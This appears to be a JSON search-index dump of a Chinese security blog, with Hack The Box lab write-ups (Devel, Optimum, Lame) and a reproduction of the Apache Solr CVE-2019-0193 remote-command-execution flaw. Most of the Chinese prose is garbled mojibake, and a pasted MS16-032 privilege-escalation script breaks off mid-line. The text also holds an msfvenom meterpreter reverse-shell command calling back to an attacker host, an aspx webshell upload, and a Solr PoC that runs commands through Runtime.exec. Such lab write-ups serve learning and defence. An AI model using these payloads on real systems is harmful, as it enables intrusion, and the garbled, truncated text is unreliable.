Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.5 å‘ç°æœåŠ¡å™¨å¼€äº† 21 ç«¯å£å’Œ 80 ç«¯å£ï¼ŒåŒæ—¶ ftp æœåŠ¡å¯ä»¥åŒ¿åè®¿é—®ï¼Œä½†æ˜¯ä¸çŸ¥é“ç‰ˆæœ¬å·ã€‚æµè§ˆå™¨è®¿é—® http æœåŠ¡ï¼Œå‘ç° åªæœ‰ iis çš„é»˜è®¤é¡µé¢ã€‚ ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"ç›®å½•æ‰«æ åˆ©ç”¨ dirsearch å·¥å…·æ‰«æä¸€æ³¢ç›®å½•ï¼š python3 dirsearch -u http://10.10.10.5 -e html å¹¶æœªæœ‰ä»€ä¹ˆç‰¹æ®Šçš„å‘ç°ã€‚ ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"FTP åŒ¿åè®¿é—® FTP æœåŠ¡ï¼Œå‘ç°å½“å‰ç›®å½•ä¸‹æœ‰å†™æƒé™ï¼Œæ‰€ä»¥ï¼Œæƒ³é€šè¿‡ä¸Šä¼  webshell çš„æ–¹å¼è·å–æœåŠ¡å™¨çš„æƒé™ã€‚ ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:1:3","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"webshell é¦–å…ˆä¸Šä¼  aspx çš„ webshellï¼š æµè§ˆå™¨è®¿é—®ï¼Œå‘ç° webshell æœªæŠ¥é”™ï¼Œå¯ä»¥æ‰§è¡Œã€‚ ç”¨èšå‰‘é“¾æ¥: è®¿é—®ä¸€äº›ç›®å½•ï¼Œå‘ç°æƒé™ä¸è¶³ã€‚ åˆ©ç”¨èšå‰‘çš„è™šæ‹Ÿç»ˆç«¯ï¼Œæ‰§è¡Œ whoami ï¼Œå‘ç°åªæœ‰ iis user çš„æƒé™ï¼Œé‚æƒ³åŠæ³•ææƒã€‚ ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:2:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"æƒé™æå‡ åˆ©ç”¨ msfvenom ç”Ÿæˆ exe æœ¨é©¬æ–‡ä»¶ï¼Œä½¿ç”¨ msf æ¥æ”¶åˆ°å›è¿çš„ shellï¼Œæ–¹ä¾¿ææƒã€‚ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=4444 -f exe \u003e shell.exe ç„¶åå°†ç”Ÿæˆçš„ shell.exe æ–‡ä»¶é€šè¿‡èšå‰‘ä¸Šä¼ åˆ°ç›®æ ‡æœåŠ¡å™¨ä¸Šï¼Œå¹¶é€šè¿‡è™šæ‹Ÿç»ˆç«¯æ‰§è¡Œã€‚ ä½¿ç”¨ msf ç›‘å¬ç«¯å£ï¼Œæ¥æ”¶å›è¿çš„ shell : ä½¿ç”¨ msf è‡ªå¸¦çš„æ£€æµ‹è„šæœ¬ï¼ŒæŸ¥çœ‹å¯èƒ½ç”¨äºææƒçš„æ¼æ´ï¼š ç»è¿‡ä¸€ä¸ªä¸€ä¸ªçš„æµ‹è¯•ï¼šå‘ç° ms10-015å¯ä»¥ç”¨æ¥ææƒã€‚ æˆåŠŸåˆ›å»ºäº†ä¸€ä¸ªæ–°çš„ session. åœ¨ meterpreter ä¸‹æ‰§è¡Œ getuid å‘½ä»¤ï¼š å‘ç°æˆåŠŸææƒã€‚ æ¥ä¸‹æ¥å°±å¯ä»¥ type c:\\users\\Administrator\\Desktop\\root.txt.txt è·å– flag äº†ã€‚ ","date":"2019-08-14","objectID":"/2019/08/hacktheboxdevel/:2:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Devel","uri":"/2019/08/hacktheboxdevel/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Lame ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›† ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["é¶åœº"],"content":"nmap nmap -T4 -A -v 10.10.10.8 å‘ç°æœåŠ¡å™¨åªå¼€äº† 80 ç«¯å£ï¼Œå¯¹åº” hfs æœåŠ¡ï¼Œæµè§ˆå™¨è®¿é—®ï¼Œå‘ç° hfs æœåŠ¡çš„ç‰ˆæœ¬å·ã€‚ ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:1:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["é¶åœº"],"content":"exploit-db æœç´¢ç›¸å…³æ¼æ´ï¼Œå‘ç°åœ¨ msf ä¸Šæœ‰å¯¹åº”çš„ exp ","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:1:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["é¶åœº"],"content":"æ¼æ´åˆ©ç”¨ msf ä¸‹ä½¿ç”¨ use exploit/windows/http/rejetto_hfs_execï¼Œå¹¶é…ç½® meterpreter payloadã€‚ exploit è¿è¡Œï¼ŒæˆåŠŸåå¼¹ meterpreter shell sysinfo ä¸Šæ˜¾ç¤ºè¯¥ç³»ç»Ÿæ˜¯ 64 ä½çš„ï¼Œä½†æ˜¯æˆ‘ä»¬é»˜è®¤ç”¨çš„ meterpreter payload æ˜¯ 32 ä½çš„ï¼Œæ‰€ä»¥å°† meterpreter è½¬ç§»åˆ° 64 ä½çš„è¿›ç¨‹ä¸Šï¼Œå¦‚ explorer.exe ç›´æ¥æŸ¥çœ‹å½“å‰ç›®å½•ï¼Œå‘ç° user.txt ï¼Œtype ä¸€ä¸‹ æŸ¥çœ‹å†…å®¹ï¼Œæäº¤å³å¯ã€‚ æ­¤æ—¶ï¼Œå‘ç°æ˜¯éç®¡ç†å‘˜æƒé™ï¼Œåœ¨ meterpreter åˆ©ç”¨ getsystem å°è¯•ææƒï¼Œå‘ç°å¤±è´¥ã€‚ å°è¯•ç”¨ msf æœ¬åœ°ææƒã€‚ å¯»æ‰¾å¯ç”¨çš„expï¼Œå‘ç°åˆ©ç”¨ ms16-032 å¯ä»¥é’ˆå¯¹ windows server 2012ã€‚ ä½†æ˜¯åœ¨å°è¯•çš„æ—¶å€™å‘ç°ä¸€ç›´ä¸æˆåŠŸï¼Œåå¼¹çš„ shell å¹¶ä¸æ˜¯ system æƒé™ã€‚ é‚æœç´¢è¯¥æ¼æ´çš„åˆ©ç”¨è„šæœ¬ã€‚ function Invoke-MS16-032 { \u003c# .SYNOPSIS PowerShell implementation of MS16-032. The exploit targets all vulnerable operating systems that support PowerShell v2+. Credit for the discovery of the bug and the logic to exploit it go to James Forshaw (@tiraniddo). Targets: * Win7-Win10 \u0026 2k8-2k12 \u003c== 32/64 bit! * Tested on x32 Win7, x64 Win8, x64 2k12R2 Notes: * In order for the race condition to succeed the machine must have 2+ CPU cores. If testing in a VM just make sure to add a core if needed mkay. * The exploit is pretty reliable, however ~1/6 times it will say it succeeded but not spawn a shell. Not sure what the issue is but just re-run and profit! * Want to know more about MS16-032 ==\u003e https://googleprojectzero.blogspot.co.uk/2016/03/exploiting-leaked-thread-handle.html .DESCRIPTION Author: Ruben Boonen (@FuzzySec) Blog: http://www.fuzzysecurity.com/ License: BSD 3-Clause Required Dependencies: PowerShell v2+ Optional Dependencies: None .PARAMETER Application Specifies an Application to run. .PARAMETER Commandline Specifies Commandline, such as net user xxx xxx /add .EXAMPLE C:\\PS\u003e Invoke-MS16-032 -Application C:\\Windows\\System32\\cmd.exe C:\\PS\u003e Invoke-MS16-032 -Application C:\\Windows\\System32\\cmd.exe -Commandline \"/c net user 1 1 /add\" #\u003e [CmdletBinding()] param( [Parameter(Mandatory = $False, ParameterSetName = 'C:\\Windows\\System32\\cmd.exe' )] [string] $Application, [Parameter(Mandatory = $False)] [string] $Commandline ) Add-Type -TypeDefinition @\" using System; using System.Diagnostics; using System.Runtime.InteropServices; using System.Security.Principal; [StructLayout(LayoutKind.Sequential)] public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; } [StructLayout(LayoutKind.Sequential, CharSet=CharSet.Unicode)] public struct STARTUPINFO { public Int32 cb; public string lpReserved; public string lpDesktop; public string lpTitle; public Int32 dwX; public Int32 dwY; public Int32 dwXSize; public Int32 dwYSize; public Int32 dwXCountChars; public Int32 dwYCountChars; public Int32 dwFillAttribute; public Int32 dwFlags; public Int16 wShowWindow; public Int16 cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; } [StructLayout(LayoutKind.Sequential)] public struct SQOS { public int Length; public int ImpersonationLevel; public int ContextTrackingMode; public bool EffectiveOnly; } public static class Advapi32 { [DllImport(\"advapi32.dll\", SetLastError=true, CharSet=CharSet.Unicode)] public static extern bool CreateProcessWithLogonW( String userName, String domain, String password, int logonFlags, String applicationName, String commandLine, int creationFlags, int environment, String currentDirectory, ref STARTUPINFO startupInfo, out PROCESS_INFORMATION processInformation); [DllImport(\"advapi32.dll\", SetLastError=true)] public static extern bool SetThreadToken( ref IntPtr Thread, IntPtr Token); [DllImport(\"advapi32.dll\", SetLastError=true)] public static extern bool OpenThreadToken( IntPtr ThreadHandle, int DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle); [DllImport(\"advapi32.dll\", SetLastError=true)] public static extern bool OpenProcessToken( IntPtr ProcessHandle, int DesiredAccess, ref IntPtr TokenHandle); [DllImport(\"advapi32.dll\", SetLastError=true)] public extern static bool DuplicateToken( IntPtr ExistingTokenHandle, int SECURITY_IMPERSONATION_LEVEL, ref IntPtr DuplicateTokenHandle); } public static class Kernel32 { [DllImport(\"kernel32.dll\")] public static extern uin","date":"2019-08-13","objectID":"/2019/08/hacktheboxoptimum/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Optimum","uri":"/2019/08/hacktheboxoptimum/"},{"categories":["é¶åœº"],"content":"Hack The Boxé¶åœºç»ƒä¹ è®°å½•","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["é¶åœº"],"content":"Hack The Box â€”â€” Lame ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:0:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["é¶åœº"],"content":"ä¿¡æ¯æœé›†ä¸æ¼æ´åˆ©ç”¨ å…ˆä¸Š nmap æ‰«æä¸€æ³¢ï¼š nmap -T4 -A -v 10.10.10.3 å‘ç°å¼€äº†å››ä¸ªç«¯å£ã€‚ æœç´¢ vsftpd ç›¸å…³æ¼æ´ï¼Œå‘ç°2.3.4ç‰ˆæœ¬è‡ªå¸¦åé—¨ï¼Œåœ¨ metasploit ä¸Šæœç´¢ï¼Œå‘ç°è¯¥æ¼æ´æ— æ³•åˆ©ç”¨ã€‚ è½¬è€Œå¯»æ‰¾ samba 3.0.20 ç‰ˆæœ¬æ¼æ´ï¼Œåœ¨ msf ä¸Šå‘ç°äº†ä¸€ä¸ª excellent çº§åˆ«çš„æ¼æ´ï¼Œå¡«ä¸Š IP ï¼Œexploit æ‰§è¡Œï¼š åå¼¹åˆ° shellã€‚ ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:1:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["é¶åœº"],"content":"è·å–flag ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:2:0","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["é¶åœº"],"content":"user.txt cat /home/makis/user.txt ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:2:1","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["é¶åœº"],"content":"root.txt cat /root/root.txt ","date":"2019-08-10","objectID":"/2019/08/hacktheboxlame/:2:2","tags":["HTBé¶åœº"],"title":"Hack The Box â€”â€” Lame","uri":"/2019/08/hacktheboxlame/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ 2019 å¹´ 8 æœˆ 1 æ—¥ï¼ŒApache Solr å®˜æ–¹å‘å¸ƒäº† CVE-2019-0193 æ¼æ´é¢„è­¦ï¼Œæ¼æ´å±å®³è¯„çº§ä¸ºä¸¥é‡ã€‚ æ­¤æ¬¡æ¼æ´å‡ºç°åœ¨ Apache Solr çš„ DataImportHandler ï¼Œè¯¥æ¨¡å—æ˜¯ä¸€ä¸ªå¯é€‰ä½†å¸¸ç”¨çš„æ¨¡å—ï¼Œç”¨äºä»æ•°æ®åº“å’Œå…¶ä»–æºä¸­æå–æ•°æ®ã€‚å®ƒå…·æœ‰ä¸€ä¸ªåŠŸèƒ½ï¼Œå…¶ä¸­æ‰€æœ‰çš„ DIH é…ç½®éƒ½å¯ä»¥é€šè¿‡å¤–éƒ¨è¯·æ±‚çš„ dataConfig å‚æ•°æ¥è®¾ç½®ã€‚ç”±äº DIH é…ç½®å¯ä»¥åŒ…å«è„šæœ¬ï¼Œå› æ­¤æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ å±é™©çš„è¯·æ±‚ï¼Œä»è€Œé€ æˆè¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚ 360CERT åˆ¤æ–­æ¼æ´ç­‰çº§ä¸ºé«˜ï¼Œå»ºè®® Apache Solr ç”¨æˆ·åŠæ—¶å‡çº§ä»¥é˜²æ­¢æ”»å‡»è€…æ”»å‡»ã€‚ ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"POC \u003cdataConfig\u003e \u003cscript\u003e\u003c![CDATA[ function f1(row){ var run = java.lang.Runtime.getRuntime().exec(\"touch /tmp/success\"); row.put('name', 'Hello World!'); return row; } ]]\u003e\u003c/script\u003e \u003cdocument\u003e \u003centity name=\"person\" transformer=\"script:f1\" query=\"select * from person\" pk=\"id\"\u003e \u003cfield column=\"id\" name=\"id\" /\u003e \u003cfield column=\"name\" name=\"name\" /\u003e \u003c/entity\u003e \u003c/document\u003e \u003c/dataConfig\u003e ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´æˆå›  è¯¥æ¼æ´çš„äº§ç”Ÿæ˜¯ç”±äºä¸¤æ–¹é¢çš„åŸå› ï¼š ç”¨æˆ·åœ¨ solrconfig.xml æ–‡ä»¶ä¸­è®¾ç½®äº† DataImportHandlerï¼Œå¼€å¯äº† DataImport åŠŸèƒ½ã€‚ DataImportHandler æ¨¡å—å…è®¸ç”¨æˆ·è‡ªå·±åŒ…å«è„šæœ¬ï¼Œæ¥è¿›è¡Œé…ç½®ã€‚ æ”»å‡»è€…å¯ä»¥é€šè¿‡æ„é€ æ¶æ„çš„è„šæœ¬äº¤ç”±è½¬æ¢å™¨è¿›è¡Œè§£æï¼Œåœ¨Solrè§£æçš„è¿‡ç¨‹ä¸­å¹¶æœªå¯¹ç”¨æˆ·çš„è¾“å…¥åšæ£€æŸ¥ï¼Œå¯å¯¼è‡´æ”»å‡»è€…è¿œç¨‹åœ¨SolræœåŠ¡å™¨ä¸Šæ‰§è¡Œå‘½ä»¤ã€‚ ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ç¯å¢ƒæ­å»º ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"solréƒ¨ç½² æœ¬ç¯å¢ƒé‡‡ç”¨dockeréƒ¨ç½² æ‹‰å–é•œåƒï¼šdocker pull solr: 8.1.1 å¯åŠ¨å®¹å™¨ï¼šdocker run â€“name solr -d -p 8983:8983 -t solr:8.1.1 è®¿é—® http://IP:8983/ï¼Œapache solr æ¡†æ¶éƒ¨ç½²å®Œæ¯• ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:1","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"å¼€å¯DataImportHandleræ’ä»¶ æ–°å»ºcoreï¼š ç‚¹å‡»Add Coreï¼Œsolrç³»ç»ŸæŠ¥é”™ã€‚ ç„¶åæ‰§è¡Œï¼šdocker exec -it â€“user root solr /bin/bashï¼Œè¿›å…¥ solr å®¹å™¨ã€‚ è¿›å…¥å®¹å™¨åï¼Œæ‰§è¡Œï¼š cp /opt/solr-8.1.1/server/solr/configsets/_default/conf /var/solr/data/new_core/ cp /opt/solr/dist/solr-dataimporthandler-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib cp /opt/solr/dist/solr-dataimporthandler-extras-8.1.1.jar /opt/solr/server/solr-webapp/webapp/WEB-INF/lib cd /var/solr/data/new_core/conf/ vim solrconfig.xml ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:2","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"DataImportHandler æ’ä»¶é…ç½® å°†ä¸‹é¢çš„ XML æ·»åŠ åˆ°solrconfig.xmlä¸­ \u003crequestHandler name=\"/dataimport\" class=\"org.apache.solr.handler.dataimport.DataImportHandler\" \u003e \u003clst name=\"defaults\"\u003e \u003cstr name=\"config\"\u003edata-config.xml\u003c/str\u003e \u003c/lst\u003e \u003c/requestHandler\u003e æ³¨ï¼šXML çš„æ ¼å¼ä¸€å®šæŒ‰ç…§ä¸Šè¿°æ ¼å¼ï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼ æ‰§è¡Œvim data-config.xmlï¼Œå¹¶å°†ä¸‹é¢ XML ä¿å­˜è‡³è¯¥æ–‡ä»¶ï¼š \u003cdataConfig\u003e \u003cdataSource driver=\"com.mysql.jdbc.Driver\" url=\"jdbc:mysql://IP:3306/securityTest\" user=\"root\" password=\"root\" /\u003e \u003cdocument\u003e \u003centity name=\"person\" query=\"select * from person\" pk=\"id\"\u003e \u003cfield column=\"id\" name=\"id\" /\u003e \u003cfield column=\"name\" name=\"name\" /\u003e \u003c/entity\u003e \u003c/document\u003e \u003c/dataConfig\u003e ç„¶åå°† mysql-connector-java-5.1.48.jar æ”¾å…¥ /opt/solr/server/solr-webapp/webapp/WEB-INF/lib æ–‡ä»¶å¤¹ä¸‹ ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:3","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"é‡å¯ solr ç„¶åé‡å¯ solrï¼š./opt/solr/bin/solr restart è‡³æ­¤ï¼Œæ¼æ´ç¯å¢ƒæ­å»ºå®Œæ¯•ï¼Œæ­å»ºæˆåŠŸçš„æˆªå›¾å¦‚ä¸‹ï¼š ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:4","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ¼æ´æµ‹è¯• ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"è®¿é—®ç®¡ç†é¡µé¢ æµè§ˆå™¨è®¿é—®ï¼šhttp://IP:8983/ ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:1","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"å¼€å¯ Debug æ¨¡å¼ å°† poc å¤åˆ¶åˆ° Configuration ä¸­ï¼š å¯åœ¨æ ‡æ³¨çš„åœ°æ–¹æ›´æ¢å—å®³æœºæ‰§è¡Œçš„å‘½ä»¤ï¼Œæœ¬æ–‡ä»¥åå¼¹shellä¸ºä¾‹ã€‚ ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:2","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"å¼€å¯ç›‘å¬ nc -lp 4567 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:3","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"æ‰§è¡Œå‘½ä»¤ ç‚¹å‡» Execute with this Configuration æ‰§è¡ŒæˆåŠŸå¯ä»¥å‘ç°shellå·²ç»æˆåŠŸåå¼¹ï¼š ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:4","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"å½±å“èŒƒå›´ Apache Solr \u003c 8.2.0 ","date":"2019-08-07","objectID":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:5:0","tags":["æ¼æ´å¤ç°","Solr"],"title":"Apache Solr è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´å¤ç°","uri":"/2019/08/apache-solr-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["æ¼æ´å¤ç°"],"content":"ä¿®å¤å»ºè®® å°†Apache Solr å‡çº§è‡³ 8.2.0 æˆ–ä¹‹åçš„ç‰ˆæœ¬ 